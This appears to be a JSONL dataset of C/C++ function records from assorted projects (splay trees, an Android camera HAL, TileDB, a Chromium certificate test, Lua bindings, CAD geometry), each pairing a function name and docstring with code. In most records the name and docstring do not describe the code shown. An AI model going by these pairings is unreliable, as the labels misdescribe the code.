{"content":"{'function_name': 'push_down', 'docstring': '\/\/\u4e0b\u653e\u6807\u8bb0 ', 'code': 'void update(Splay *x){\/\/\u66f4\u65b0\u8282\u70b9 \\n\\tif(x==null)return;\\n\\tpush_down(x),push_down(x->son[0]),push_down(x->son[1]);\/\/\u8981\u7528\u5230\u5b50\u8282\u70b9\u7684maxl,maxr\u6240\u4ee5\u8981\u4e0b\u653e\u5b50\u8282\u70b9\u6807\u8bb0 \\n\\tx->size=x->son[0]->size+x->son[1]->size+1,\/\/\u66f4\u65b0\u8282\u70b9\u5b58\u50a8\u7684\u503c \\n\\tx->sum=x->son[0]->sum+x->son[1]->sum+x->key,\\n\\tx->maxl=max(x->son[0]->maxl,x->son[0]->sum+x->key+max(0,x->son[1]->maxl)),\\n\\tx->maxr=max(x->son[1]->maxr,x->son[1]->sum+x->key+max(0,x->son[0]->maxr));\\n\\tx->maxt=Max(3,x->son[0]->maxt,x->son[1]->maxt,max(0,x->son[0]->maxr)+max(0,x->son[1]->maxl)+x->key);\\n}'}","id":3693}
{"content":"{'function_name': 'usbcam_take_picture', 'docstring': '\/* TBD: Need to handle any dependencies on video recording state *\/', 'code': 'int usbcam_set_parameters(struct camera_device *device, const char *params)\\n    {\\n    \\tALOGD(\"%s: E\", __func__);\\n        String8 str = String8(params);\\n\\t\\tCameraParameters lParam;\\n\\t\\tint width,height;\\n\\t\\tint tmpval;\\n\\t\\tcamera_hardware_t *camHal;\\n\\t\\tVALIDATE_DEVICE_HDL(camHal, device, -1);\\n        Mutex::Autolock autoLock(camHal->lock);\\n\\t\\t\\t\\t\\n        int rc = 0;\\n\\t\\tif(params)\\n   \\t\\t     PRINT_PARAM_STR(params);\\n\\t\\tlParam.unflatten(str);\\n\\t\\tlParam.getPreviewSize(&width, &height);\\n\\t\\tALOGE(\"%s: width -> %d,height -> %d\", __func__,width,height);\\n\\t\\tif((width > 0) && (height > 0))\\n\\t\\t{\\n\\t\\t\\t\/*\\n\\t\\t\\tif((width == 480)&& (height == 270))\\n\\t\\t\\t{\\n\\t\\t\\t\\tALOGE(\"%s: 480x270 ==>set to 320x240\", __func__);\\n\\t\\t\\t\\tcamHal->prevWidth   = 320;\\n\\t\\t        camHal->prevHeight  = 240;\\n\\t\\t        camHal->dispWidth   = 320;\\n\\t\\t        camHal->dispHeight  = 240;\\n\\t\\t\\t}\\n\\t\\t\\telse\\n\\t\\t\\t*\/\\n\\t\\t\\t{\\n\\t\\t\\t\\tcamHal->prevWidth   = width;\\n\\t\\t        camHal->prevHeight  = height;\\n\\t\\t        camHal->dispWidth   = width;\\n\\t\\t        camHal->dispHeight  = height;\\n\\t\\t\\t}\\t\\n\\t\\t}\\t\\n\\t\\t\/*set preview par*\/\\n\\t\\ttmpval = lParam.getInt(\"contrast\");\\n\\t\\tif(tmpval >= 0)\\n\\t\\t{\\n\\t\\t\\tALOGE(\"%s: contrast -> %d\\\\n\", __func__,tmpval);\\n\\t\\t\\tv4l2_vidio_s_ctrl(camHal->fd, \"V4L2_CID_CONTRAST\",V4L2_CID_CONTRAST, tmpval);\\n\\t\\t}\\n\\t\\ttmpval = lParam.getInt(\"saturation\");\\n\\t\\tif(tmpval >= 0)\\n\\t\\t{\\n\\t\\t\\tALOGE(\"%s: saturation -> %d\\\\n\", __func__,tmpval);\\n\\t\\t\\tv4l2_vidio_s_ctrl(camHal->fd, \"V4L2_CID_SATURATION\",V4L2_CID_SATURATION, tmpval);\\n\\t\\t}\\n\\t\\ttmpval = lParam.getInt(\"bright\");\\n\\t\\tif(tmpval >= 0)\\n\\t\\t{\\n\\t\\t\\tALOGE(\"%s: bright -> %d\\\\n\", __func__,tmpval);\\n\\t\\t\\tv4l2_vidio_s_ctrl(camHal->fd, \"V4L2_CID_BRIGHTNESS\", V4L2_CID_BRIGHTNESS,tmpval);\\n\\t\\t}\\n\\t\\ttmpval = lParam.getInt(\"hue\");\\n\\t\\tif(tmpval >= 0)\\n\\t\\t{\\n\\t\\t\\tALOGE(\"%s: hue -> %d\\\\n\", __func__,tmpval);\\n\\t\\t\\tv4l2_vidio_s_ctrl(camHal->fd, \"V4L2_CID_HUE\", V4L2_CID_HUE,tmpval);\\n\\t\\t}\\n\\t\\t\\n\\t\\t\\n        ALOGD(\"%s: X\", __func__);\\n        return 0;\\n    }'}","id":3696}
{"content":"{'function_name': 'assign', 'docstring': '\/\/ This case should not be reachable', 'code': 'Flag negFlag(Flag flag)\\n{\\n  switch(flag) {\\n    case ZS: return ZC;\\n    case ZC: return ZS;\\n    case NS: return NC;\\n    case NC: return NS;\\n  }\\n\\n  \/\/ Not reachable\\n  assert(false);\\n}'}","id":3701}
{"content":"{'function_name': 'subarray_partitioner_to_capnp', 'docstring': \"\/\/ If stats object exists set its cap'n proto object\", 'code': \"Status subarray_partitioner_from_capnp(\\n    Stats* query_stats,\\n    Stats* reader_stats,\\n    const Config& config,\\n    const Array* array,\\n    const capnp::SubarrayPartitioner::Reader& reader,\\n    SubarrayPartitioner* partitioner,\\n    ThreadPool* compute_tp,\\n    const bool& compute_current_tile_overlap) {\\n  \/\/ Get memory budget\\n  uint64_t memory_budget = 0;\\n  RETURN_NOT_OK(tiledb::sm::utils::parse::convert(\\n      Config::SM_MEMORY_BUDGET, &memory_budget));\\n  uint64_t memory_budget_var = 0;\\n  RETURN_NOT_OK(tiledb::sm::utils::parse::convert(\\n      Config::SM_MEMORY_BUDGET_VAR, &memory_budget_var));\\n  uint64_t memory_budget_validity = 0;\\n\\n  \/\/ Get subarray layout first\\n  Layout layout = Layout::ROW_MAJOR;\\n  auto subarray_reader = reader.getSubarray();\\n  RETURN_NOT_OK(layout_enum(subarray_reader.getLayout(), &layout));\\n\\n  \/\/ Subarray, which is used to initialize the partitioner.\\n  Subarray subarray(array, layout, query_stats, dummy_logger, true);\\n  RETURN_NOT_OK(subarray_from_capnp(reader.getSubarray(), &subarray));\\n  *partitioner = SubarrayPartitioner(\\n      &config,\\n      subarray,\\n      memory_budget,\\n      memory_budget_var,\\n      memory_budget_validity,\\n      compute_tp,\\n      reader_stats,\\n      dummy_logger);\\n\\n  \/\/ Per-attr mem budgets\\n  if (reader.hasBudget()) {\\n    const auto& schema = array->array_schema_latest();\\n    auto mem_budgets_reader = reader.getBudget();\\n    auto num_attrs = mem_budgets_reader.size();\\n    for (size_t i = 0; i < num_attrs; i++) {\\n      auto mem_budget_reader = mem_budgets_reader[i];\\n      std::string attr_name = mem_budget_reader.getAttribute();\\n      auto var_size = schema.var_size(attr_name);\\n      auto nullable = schema.is_nullable(attr_name);\\n\\n      if (attr_name == constants::coords || !var_size) {\\n        if (nullable) {\\n          RETURN_NOT_OK(partitioner->set_result_budget_nullable(\\n              attr_name.c_str(),\\n              mem_budget_reader.getDataBytes(),\\n              mem_budget_reader.getValidityBytes()));\\n        } else {\\n          RETURN_NOT_OK(partitioner->set_result_budget(\\n              attr_name.c_str(), mem_budget_reader.getDataBytes()));\\n        }\\n      } else {\\n        if (nullable) {\\n          RETURN_NOT_OK(partitioner->set_result_budget_nullable(\\n              attr_name.c_str(),\\n              mem_budget_reader.getOffsetBytes(),\\n              mem_budget_reader.getDataBytes(),\\n              mem_budget_reader.getValidityBytes()));\\n        } else {\\n          RETURN_NOT_OK(partitioner->set_result_budget(\\n              attr_name.c_str(),\\n              mem_budget_reader.getOffsetBytes(),\\n              mem_budget_reader.getDataBytes()));\\n        }\\n      }\\n    }\\n  }\\n\\n  \/\/ Current partition info\\n  if (reader.hasCurrent()) {\\n    auto partition_info_reader = reader.getCurrent();\\n    auto* partition_info = partitioner->current_partition_info();\\n    partition_info->start_ = partition_info_reader.getStart();\\n    partition_info->end_ = partition_info_reader.getEnd();\\n    partition_info->split_multi_range_ =\\n        partition_info_reader.getSplitMultiRange();\\n    partition_info->partition_ =\\n        Subarray(array, layout, query_stats, dummy_logger, true);\\n    RETURN_NOT_OK(subarray_from_capnp(\\n        partition_info_reader.getSubarray(), &partition_info->partition_));\\n\\n    if (compute_current_tile_overlap) {\\n      throw_if_not_ok(partition_info->partition_.precompute_tile_overlap(\\n          partition_info->start_,\\n          partition_info->end_,\\n          &config,\\n          compute_tp,\\n          true));\\n    }\\n  }\\n\\n  \/\/ Partitioner state\\n  auto state_reader = reader.getState();\\n  auto* state = partitioner->state();\\n  state->start_ = state_reader.getStart();\\n  state->end_ = state_reader.getEnd();\\n  auto sr_reader = state_reader.getSingleRange();\\n  const unsigned num_sr = sr_reader.size();\\n  for (unsigned i = 0; i < num_sr; i++) {\\n    auto subarray_reader_ = sr_reader[i];\\n    state->single_range_.emplace_back(\\n        array, layout, query_stats, dummy_logger, true);\\n    Subarray& subarray_ = state->single_range_.back();\\n    RETURN_NOT_OK(subarray_from_capnp(subarray_reader_, &subarray_));\\n  }\\n  auto m_reader = state_reader.getMultiRange();\\n  const unsigned num_m = m_reader.size();\\n  for (unsigned i = 0; i < num_m; i++) {\\n    auto subarray_reader_ = m_reader[i];\\n    state->multi_range_.emplace_back(\\n        array, layout, query_stats, dummy_logger, true);\\n    Subarray& subarray_ = state->multi_range_.back();\\n    RETURN_NOT_OK(subarray_from_capnp(subarray_reader_, &subarray_));\\n  }\\n\\n  \/\/ Overall mem budget\\n  RETURN_NOT_OK(partitioner->set_memory_budget(\\n      reader.getMemoryBudget(),\\n      reader.getMemoryBudgetVar(),\\n      reader.getMemoryBudgetValidity()));\\n\\n  \/\/ If cap'n proto object has stats set it on c++ object\\n  if (reader.hasStats()) {\\n    auto stats = partitioner->stats();\\n    \/\/ We should always have stats\\n    if (stats != nullptr) {\\n      RETURN_NOT_OK(stats_from_capnp(reader.getStats(), stats));\\n    }\\n  }\\n\\n  return Status::Ok();\\n}\"}","id":3707}
{"content":"{'function_name': 'Namespaces_prefix_add', 'docstring': '\/\/  build nsp prefixes string', 'code': 'gboolean            Free()\\n{\\n    GSList      *       l       =   NULL;\\n    NSP         *       nsp     =   NULL;\\n    CHA         *       cha     =   NULL;\\n    \/\/  ........................................................................\\n    \/\/  free all dynamic vars\\n    delete  gd_namespaces_prefixes;\\n    g_free_safe(    gd_namespaces_prefix        );\\n    g_free_safe(    gd_channels_prefix          );\\n    g_free_safe(    gd_file_def                 );\\n    g_free_safe(    gd_file_h                   );\\n    g_free_safe(    gd_file_cc                  );\\n    g_free_safe(    gd_global_logger_pointer    );\\n\\n\\n    \/\/  static          GSList                      *       gd_slist_nsp            = NULL;\\n    \/\/  static          GSList                      *       gd_slist_cha            = NULL;\\n    \/\/  static          libgwr::StackGS < NSP *  >  *       gd_stack_nsp            = GWR_NEW_CAST( libgwr::StackGS < NSP * > );\\n\\n    l = gd_slist_nsp ; while ( l )\\n    {\\n        nsp = static_cast < NSP* > ( l->data );\\n\\n        delete nsp;\\n\\n        l = g_slist_next( l );\\n    }\\n    g_slist_free( gd_slist_nsp );\\n\\n    l = gd_slist_cha ; while ( l )\\n    {\\n        cha = static_cast < CHA* > ( l->data );\\n\\n        delete cha;\\n\\n        l = g_slist_next( l );\\n    }\\n    g_slist_free( gd_slist_cha );\\n\\n    return TRUE;\\n}'}","id":3711}
{"content":"{'function_name': 'sherlock', 'docstring': '\/\/ handle less than 4 rows. cols', 'code': 'int main() {\\n    ios_base::sync_with_stdio(false);\\n    cin.tie(nullptr);\\n    int tt = 1;\\n    \/\/ cin >> tt;\\n    for (int t = 1; t <= tt; t++) sherlock(t);\\n    return 0;\\n}'}","id":3712}
{"content":"{'function_name': 'search', 'docstring': '\/\/ !!Write Recursive version', 'code': 'int searchR(string s[], string x, int low, int high) {\\n\\tif(low>high) return -1;\\n\\n\\t\/\/ move mid to the middle\\n\\tint mid = (low+high)\/2;\\n\\n\\t\/\/ if mid is \"\", find the closest non-empty string\\n\\tif(s[mid]==\"\") {\\n\\t\\tint left = mid-1;\\n\\t\\tint right = mid+1;\\n\\t\\twhile(true) {\\n\\t\\t\\tif(left<low && right>high) {\\n\\t\\t\\t\\treturn -1;\\n\\t\\t\\t} else if(right <= high && s[right]!=\"\") {\\n\\t\\t\\t\\tmid=right;\\n\\t\\t\\t\\tbreak;\\n\\t\\t\\t} else if(left >= low && s[left]!=\"\") {\\n\\t\\t\\t\\tmid=left;\\n\\t\\t\\t\\tbreak;\\n\\t\\t\\t}\\n\\t\\tright++;\\n\\t\\tleft--;\\n\\t\\t}\\n\\t}\\n\\n\\t\/\/ Check for string, and recurse if necessary\\n\\tif(s[mid]==x) { \/\/ found it\\n\\t\\treturn mid;\\n\\t} else if (s[mid] < x) {\\t\/\/ search right \\n\\t\\treturn searchR(s, x, mid+1,  high);\\n\\t} else {\\t\/\/ search left\\n\\t\\treturn searchR(s, x, low, mid-1);\\n\\t}\\n}'}","id":3724}
{"content":"{'function_name': 'TEST_F', 'docstring': \"\/\/ we don't fall back to online revocation checks.\", 'code': 'TEST_F(HTTPSCRLSetTest, ExpiredCRLSetAndRevoked) {\\n  \/\/ Test that when online revocation checking is disabled, and the leaf\\n  \/\/ certificate is not EV, that no revocation checking actually happens.\\n  if (!SystemSupportsOCSP()) {\\n    LOG(WARNING) << \"Skipping test because system doesn\\'t support OCSP\";\\n    return;\\n  }\\n\\n  EmbeddedTestServer::ServerCertificateConfig cert_config;\\n  cert_config.ocsp_config = EmbeddedTestServer::OCSPConfig(\\n      {{OCSPRevocationStatus::REVOKED,\\n        EmbeddedTestServer::OCSPConfig::SingleResponse::Date::kValid}});\\n\\n  UpdateCertVerifier(CRLSet::ExpiredCRLSetForTesting());\\n\\n  CertStatus cert_status;\\n  DoConnection(cert_config, &cert_status);\\n\\n  EXPECT_EQ(0u, cert_status & CERT_STATUS_ALL_ERRORS);\\n\\n  EXPECT_FALSE(cert_status & CERT_STATUS_IS_EV);\\n  EXPECT_FALSE(cert_status & CERT_STATUS_REV_CHECKING_ENABLED);\\n}'}","id":3725}
{"content":"{'function_name': 'maxmatch', 'docstring': '\/\/\u5bf9\u4e24\u4e2a\u90e8\u91cc\u7684\u90fd\u5339\u914d\u4e86\uff0c\u8fd9\u6837\u5c31\u76f8\u5f53\u4e8e\u5339\u914d\u4e86\u4e24\u6b21\u4e86  ', 'code': 'bool istwo()\\n{\/\/\u5224\u65ad\u662f\u5426\u4e3a\u4e8c\u5206\u56fe\\n    queue<int>q;\\n    memset(vis, 0, sizeof(vis));\\n    q.push(1);\\n    vis[1] = true;\\n    while (!q.empty())\\n    {\\n        int u = q.front();\\n        q.pop();\\n        for (int i = 1; i <= n; i++)\\n        {\\n            if (mp[u][i])\\n            {\\n                if (vis[i] == 0)\\n                {\\n                    if (vis[u] == 1) vis[i] = 2;\\n                    else vis[i] = 1;\\n                    q.push(i);\\n                }\\n                else\\n                {\\n                    if (vis[i] == vis[u]) return false;\\n                }\\n            }\\n        }\\n    }\\n    return true;\\n}'}","id":3726}
{"content":"{'function_name': 'ErrMsg', 'docstring': '\/\/ERR.Reset();', 'code': 'int Read_BdlFilePath()\\n{\\n\\tFILE *fp; \\n\\tchar  fName[200]; \\n\\n\\n\\t\/\/ \"C:\\\\ACE400\\\\SETUP\\\\FilePathJig.ini\"\\n\\t::ZeroMemory(&fName, sizeof(fName));\\n\\tstrcat( fName , g_sFile.ACE400_FilePathJigName ); \/\/sylee121202\\n\\n\\tif(!FileExists(fName)) { \\t\\n\\t\\tERR.Set(FLAG_FILE_NOT_FOUND, fName); return FALSE; \\n\\t}\\n\\n\\tfp=fopen(fName,\"rt\");\\t\\n\\tif(fp == NULL) { \\n\\t\\tERR.Set(FLAG_FILE_CANNOT_OPEN, fName); return FALSE;\\n\\t}\\n\\n\\t\/\/ 2018.02.28  FilePathJig.ini \ubc0f bdl \ud30c\uc77c path \uc774\ub984\uc5d0 \uacf5\ubc31\uc774 \ud3ec\ud568\uac00\ub2a5\ud558\ub3c4\ub85d \uc218\uc815.\\n\\tchar tempStr[200];\\n\\tchar c;\\n\\n\\t\/\/son \uccab 3\uc904\uc740 skip\\n\\tfscanf(fp, \"%[^\\\\n]s\", tempStr);\\t\/\/ \"%[^\\\\n]s\" : \uacf5\ubc31\uc744 \ud3ec\ud568\ud55c \ubb38\uc790\uc5f4 \uc785\ub825\\n\\tfscanf(fp, \"%c\", &c);\\t\\t\\t\/\/ \"%[^\\\\n]s\" \uc0ac\uc6a9\ud6c4 \ub0a8\uc740 \uac1c\ud589\ubb38\uc790(\\\\n) \ucc98\ub9ac\\n\\tfscanf(fp, \"%[^\\\\n]s\", tempStr);\\t\\n\\tfscanf(fp, \"%c\", &c);\\t\\t\\t\\n\\tfscanf(fp, \"%[^\\\\n]s\", tempStr);\\t\\n\\tfscanf(fp, \"%c\", &c);\\t\\t\\t\\n\\n\\n\\tfscanf(fp, \"%[^\\\\n]s\", g_sFile.ACE400_BdlFilePath);\\t\/\/ ex) C:\\\\ACE400\\\\QC-JIG-S100-BHFlex\\\\4W_YP_S100\\\\OPEN-READ.BDL \\n\\tfscanf(fp, \"%c\", &c);\\t\\t\\t\\n\\tfscanf(fp, \"%[^\\\\n]s\", g_sFile.ACE400_BdlFileDir); \\t\/\/ ex) C:\\\\ACE400\\\\QC-JIG-S100-BHFlex\\\\4W_YP_S100\\n\\tfscanf(fp, \"%c\", &c);\\t\\t\\t\\n\\tfscanf(fp, \"%[^\\\\n]s\", g_sFile.ACE400_BdlFileName);\\t\/\/ ex) OPEN-READ.BDL \\n\\n\\tfclose(fp); \\n\\treturn TRUE;\\n}'}","id":3727}
{"content":"{'function_name': 'lua_ref_release_module', 'docstring': '\/\/ \u4ece\u6808\u5e95\u8fd4\u56de\u5bf9\u8c61', 'code': 'int lua_ref_getRefCount_module(lua_State *L)\\n{\\n    \/\/ \u4ece\u6808\u5e95\u8fd4\u56de\u5bf9\u8c61\\n    Ref **obj = (Ref **)lua_touserdata(L, 1);\\n    luaL_argcheck(L, obj != NULL, 1, \"invalid user data\");\\n    int argc = lua_gettop(L) - 1;\\n    if (argc == 0)\\n    {\\n        \/\/ \u6e05\u7a7astack\\n        \/\/ lua_settop(L, 0);\\n\\n        int refCount = (*obj)->getRefCount();\\n\\n        lua_pushinteger(L, refCount);\\n        return 1;\\n    }\\n    else\\n    {\\n        std::cout << \"argc should\" << argc << endl;\\n        return 0;\\n    }\\n}'}","id":3732}
{"content":"{'function_name': 'interruptionListenerCallback', 'docstring': '\/\/\\tModizMusicPlayer *mplayer=(ModizMusicPlayer*)inUserData;\\r', 'code': 'static int SDLSoundInit()\\r\\n{\\r\\n    AudioStreamBasicDescription mDataFormat;\\r\\n    UInt32 err;\\r\\n    \\r\\n    switch (cur_ifba_conf->sound_freq) {\\r\\n        case 0:\\r\\n            nAudSampleRate[0]=22050;\\r\\n            break;\\r\\n        default:\\r\\n        case 1:\\r\\n            nAudSampleRate[0]=44100;\\r\\n            break;\\r\\n    }    \\r\\n    switch (cur_ifba_conf->sound_latency) {  \/\/TODO: maybe should depend how sound_frequency\\r\\n        case 0:\\r\\n            nAudSegCount=2;\\r\\n            break;\\r\\n        case 1:\\r\\n            nAudSegCount=4;\\r\\n            break;\\r\\n        case 2:\\r\\n            nAudSegCount=6;\\r\\n            break;\\r\\n    }\\r\\n    \\r\\n    nSoundFps = nAppVirtualFps;\\r\\n\\tnAudSegLen = (nAudSampleRate[0] * 100 + (nSoundFps >> 1)) \/ nSoundFps;\\r\\n\\tnAudLoopLen = (nAudSegLen * 1\/*nAudSegCount*\/) << 2;\\t    \\r\\n    \/\/    printf(\"snd buff:%d\\\\n\",nAudSegLen);\\r\\n    \\r\\n    AudioSessionInitialize (\\r\\n                            NULL,\\r\\n                            NULL,\\r\\n                            interruptionListenerCallback,\\r\\n                            NULL\\r\\n                            );\\r\\n    UInt32 sessionCategory = kAudioSessionCategory_AmbientSound;\\r\\n    AudioSessionSetProperty (\\r\\n                             kAudioSessionProperty_AudioCategory,\\r\\n                             sizeof (sessionCategory),\\r\\n                             &sessionCategory\\r\\n                             );\\r\\n    \\r\\n    \/\/Check if still required or not \\r\\n    Float32 preferredBufferDuration = nAudSegLen*1.0f\/nAudSampleRate[0];                      \/\/ 1\\r\\n    AudioSessionSetProperty (                                     \/\/ 2\\r\\n                             kAudioSessionProperty_PreferredHardwareIOBufferDuration,\\r\\n                             sizeof (preferredBufferDuration),\\r\\n                             &preferredBufferDuration\\r\\n                             );\\r\\n    AudioSessionPropertyID routeChangeID = kAudioSessionProperty_AudioRouteChange;    \/\/ 1\\r\\n    AudioSessionAddPropertyListener (                                 \/\/ 2\\r\\n                                     routeChangeID,                                                 \/\/ 3\\r\\n                                     propertyListenerCallback,                                      \/\/ 4\\r\\n                                     NULL                                                       \/\/ 5\\r\\n                                     );\\r\\n    AudioSessionSetActive (true);\\t\\r\\n    \\r\\n    \\r\\n    buffer_ana_flag=(int*)malloc(nAudSegCount*sizeof(int));\\r\\n    buffer_ana=(short int**)malloc(nAudSegCount*sizeof(unsigned short int *));\\r\\n    for (int i=0;i<nAudSegCount;i++) {\\r\\n        buffer_ana[i]=(short int *)malloc(nAudLoopLen);\\r\\n        buffer_ana_flag[i]=0;\\r\\n    }\\r\\n    \\r\\n    mDataFormat.mFormatID = kAudioFormatLinearPCM;\\r\\n    mDataFormat.mFormatFlags = kLinearPCMFormatFlagIsSignedInteger | kAudioFormatFlagIsPacked;\\r\\n\\t\\r\\n\\tmDataFormat.mSampleRate = nAudSampleRate[0];\\r\\n    \\r\\n\\tmDataFormat.mBitsPerChannel = 16;\\r\\n    \\r\\n\\tmDataFormat.mChannelsPerFrame = 2;\\r\\n    \\r\\n    mDataFormat.mBytesPerFrame = (mDataFormat.mBitsPerChannel>>3) * mDataFormat.mChannelsPerFrame;\\r\\n\\t\\r\\n    mDataFormat.mFramesPerPacket = 1; \\r\\n    mDataFormat.mBytesPerPacket = mDataFormat.mBytesPerFrame;\\r\\n    \\r\\n    \/* Create an Audio Queue... *\/\\r\\n    err = AudioQueueNewOutput( &mDataFormat, \\r\\n\\t\\t\\t\\t\\t\\t\\t  emu_AudioCallback, \\r\\n\\t\\t\\t\\t\\t\\t\\t  NULL, \\r\\n\\t\\t\\t\\t\\t\\t\\t  NULL, \/\/CFRunLoopGetCurrent(),\\r\\n\\t\\t\\t\\t\\t\\t\\t  kCFRunLoopCommonModes,\\r\\n\\t\\t\\t\\t\\t\\t\\t  0, \\r\\n\\t\\t\\t\\t\\t\\t\\t  &mAudioQueue );\\r\\n    \\r\\n    \/* ... and its associated buffers *\/\\r\\n    mBuffers = (AudioQueueBufferRef*)malloc( sizeof(AudioQueueBufferRef) * nAudSegCount );\\r\\n    for (int i=0; i<nAudSegCount; i++) {\\r\\n\\t\\tAudioQueueBufferRef mBuffer;\\r\\n\\t\\terr = AudioQueueAllocateBuffer( mAudioQueue, nAudLoopLen, &mBuffer );\\t\\t\\r\\n\\t\\tmBuffers[i]=mBuffer;\\r\\n    }\\r\\n    \/* Set initial playback volume *\/\\r\\n    err = AudioQueueSetParameter( mAudioQueue, kAudioQueueParam_Volume, mVolume );\\r\\n    \\r\\n    nAudNextSound = (short*)malloc(nAudSegLen << 2);\\r\\n\\tif (nAudNextSound == NULL) {\\r\\n\\t\\tSDLSoundExit();\\r\\n\\t\\treturn 1;\\r\\n\\t}\\r\\n    memset(nAudNextSound,0,nAudSegLen<<2);\\r\\n    \\r\\n    \\r\\n    return 0;\\r\\n}'}","id":3733}
{"content":"{'function_name': 'TransfAllLoopToCPath', 'docstring': '\/\/ STEP 1 : \u5c06\u66f2\u7ebf\u8f6c\u5316\u6210\u4e09\u7ef4\u8def\u5f84', 'code': 'BOOL SubtractContour( CSmartLoop *pCurr, CSmartLoop *pLast, CSmartLoop *AllLoop, CSmartCurveLib& CurLib, double dMinLen, BOOL bBtw )\\n{\\n\\tif( !pCurr || !pLast ) return NULL ;\\n\\t\\n\\tCSmartCurveLib tmpLib ;\\n\\t\/\/ STEP 0 : \u8f6e\u5ed3\u521d\u59cb\u5316, \u8f6e\u5ed3\u6c42\u4ea4\\n\\tCSmartLoop *pLoopA = NULL, *pLoopB = NULL,  *pIsland = NULL ;\\n\\tfor( pLoopA = pCurr ; pLoopA ; pLoopA = pLoopA->next )\\n\\t{\\n\\t\\tpLoopA->InitBuffer() ;\\n\\t}\\n\\tfor( pLoopB = pLast ; pLoopB ; pLoopB = pLoopB->next )\\n\\t{\\n\\t\\tpLoopB->InitBuffer() ;\\n\\t}\\n\\tfor( pLoopA = pCurr ; pLoopA ; pLoopA = pLoopA->next )\\n\\t{\\n\\t\\tfor( pLoopB = pLast ; pLoopB ; pLoopB = pLoopB->next )\\n\\t\\t{\\n            pLoopA->ContourContourInt( pLoopB );\\n        }\\n\\t}\\n\\t\/\/ STEP 1 \u8f6e\u5ed3A\u6253\u65ad\\n\\tCSmartCurve *pCurveTemp, *pCurveHead ;\\n\\tPNT2D dMidPnt, start, end ;\\n\\tint bIntFlag = 0 ;\\n\\tfor( pLoopA = pCurr ; pLoopA ; pLoopA = pLoopA->next )\\n\\t{\\n        pCurveHead = pLoopA->ContourBreak();\\n        for(  ; pCurveHead  ; pCurveHead = pCurveTemp )\\n        {\\n\\t\\t\\tpCurveTemp = pCurveHead->next ;\\n\\t\\t\\tpCurveHead->next = NULL ;\\n\\t\\t\\tpCurveHead->GetMidPoint(dMidPnt);\\n\\t\\t\\tpCurveHead->GetStart ( start ) ;\\n\\t\\t\\tpCurveHead->GetEnd ( end ) ;\\n\\t\\t    bIntFlag = Mini_IsPointOnContours( pLast, dMidPnt ) ;\\n\\t\\t\\tif( bIntFlag < 1 )   \/\/(\u4e0d\u843d\u5728\u4e0a\u628a\u5200\u533a\u57df\u91cc)    \\n\\t\\t\\t{ \\n\\t\\t\\t\\tif( !bBtw ) tmpLib.AddCurves ( pCurveHead ) ;\\n\\t\\t\\t\\telse\\t\\tdelete pCurveHead ;\\n\\t\\t\\t}\\n\\t\\t\\telse \\n\\t\\t\\t{\\n\\t\\t\\t\\tif( !bBtw ) delete pCurveHead ;\\n\\t\\t\\t\\telse\\t\\ttmpLib.AddCurves ( pCurveHead ) ;\\n\\t\\t\\t}\\n\\t\\t} \\n\\t}\\n\\t\\n\\t\/\/ STEP 2 : \u4f7f\u7528AllLoop\u5bf9\u5f97\u5230\u7684\u66f2\u7ebf\u8fdb\u884c\u88c1\u51cf,\u4fdd\u7559AllLoop\u4e2d\u7684\u90e8\u5206\\n\\tfor( pLoopB = AllLoop ; pLoopB ; pLoopB = pLoopB->next )\\n\\t{\\n\\t\\tpLoopB->InitBuffer() ;\\n\\t}\\n\\tCSmartCurve *pHead = tmpLib.m_pHead, *pNext = NULL ;\\n\\tfor( ; pHead ; pHead = pHead->next )\\n\\t{\\n\\t\\tpHead->DefineBox () ;\\n\\t\\tfor( pLoopB = AllLoop ; pLoopB ; pLoopB = pLoopB->next )\\n\\t\\t{\\n            pHead->CurveCurveInt ( pLoopB->m_pCurve ) ;\\n\\t\\t\\tfor( pIsland = pLoopB->GetIsland () ; pIsland ; pIsland = pIsland->next )\\n\\t\\t\\t{\\n\\t\\t\\t\\tpHead->CurveCurveInt ( pIsland->m_pCurve ) ;\\n\\t\\t\\t}\\n        }\\n\\t}\\n\\tfor( pHead = tmpLib.m_pHead ; pHead ; pHead = pHead->next )\\n\\t{\\n\\t\\tpCurveHead = pHead->BreakCurve () ;\\n\\t\\tfor(  ; pCurveHead  ; pCurveHead = pCurveTemp )\\n        {\\n\\t\\t\\tpCurveTemp = pCurveHead->next ;\\n\\t\\t\\tpCurveHead->next = NULL ;\\n\\t\\t\\tpCurveHead->GetMidPoint(dMidPnt);\\n\\t\\t    bIntFlag = Mini_IsPointOnContours( AllLoop, dMidPnt ) ;\\n\\t\\t\\tif( bIntFlag > 0 )   \/\/(\u843d\u5728\u8fb9\u754c\u91cc)    \\n\\t\\t\\t{ \/\/ \u4fdd\u7559\u66f2\u7ebf,\u4fdd\u7559\u91cd\u7ebf\\n\\t\\t\\t\\tCurLib.AddCurves ( pCurveHead ) ;\\n\\t\\t\\t}\\n\\t\\t\\telse \\n\\t\\t\\t{\\n\\t\\t\\t\\tdelete pCurveHead ;\\n\\t\\t\\t}\\n\\t\\t} \\n\\t}\\n\\ttmpLib.DeleteAllCurves () ;\\n\\t\/\/ STEP 3 : \u8fde\u63a5\u66f2\u7ebf\u5e76\u5220\u9664\u7279\u522b\u5c0f\u7684\\n\\tCurLib.ConnectCurve ( 0.0001 ) ;\\n\\tpHead = CurLib.m_pHead ;\\n\\twhile( pHead )\\n\\t{\\n\\t\\tpNext = pHead->next ;\\n\\t\\tpHead->DefineBox () ;\\n\\t\\tif( pHead->GetLength () < dMinLen )\\n\\t\\t{\\n\\t\\t\\tCurLib.DeleteCurve ( pHead ) ;\\n\\t\\t}\\n\\t\\tpHead = pNext ;\\n\\t}\\n\\tif( CurLib.m_nNumCurve < 1 ) return FALSE ;\\t\\n\\treturn TRUE ;\\n}'}","id":3736}
